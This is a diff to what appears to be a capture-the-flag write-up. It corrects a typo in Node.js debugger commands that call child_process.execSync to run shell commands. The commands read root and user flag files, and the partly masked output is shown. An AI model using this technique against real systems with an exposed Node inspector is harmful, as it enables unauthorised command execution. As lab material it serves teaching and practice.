@@ -236,16 +236,16 @@ debug>
 The below command can be used to legitimately execute code into the process
 
 ```zsh wrap=false
-exeexec('global.process.mainModule.require("child_process").execSync("<your sauce goes here>").toString()')
+exec('global.process.mainModule.require("child_process").execSync("<your sauce goes here>").toString()')
 ```
 
 ### Flags
 
 ```zsh wrap=false
-debug> exeexec('global.process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')
+debug> exec('global.process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')
 exec('global.process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')
 '2a41****26e1****b118****09e8****\n'
-debug> exeexec('global.process.mainModule.require("child_process").execSync("cat /home/engineer/user.txt").toString()')
+debug> exec('global.process.mainModule.require("child_process").execSync("cat /home/engineer/user.txt").toString()')
 exec('global.process.mainModule.require("child_process").execSync("cat /home/engineer/user.txt").toString()')
 '863d****8ad6****0b69****4a00****\n'
 debug>
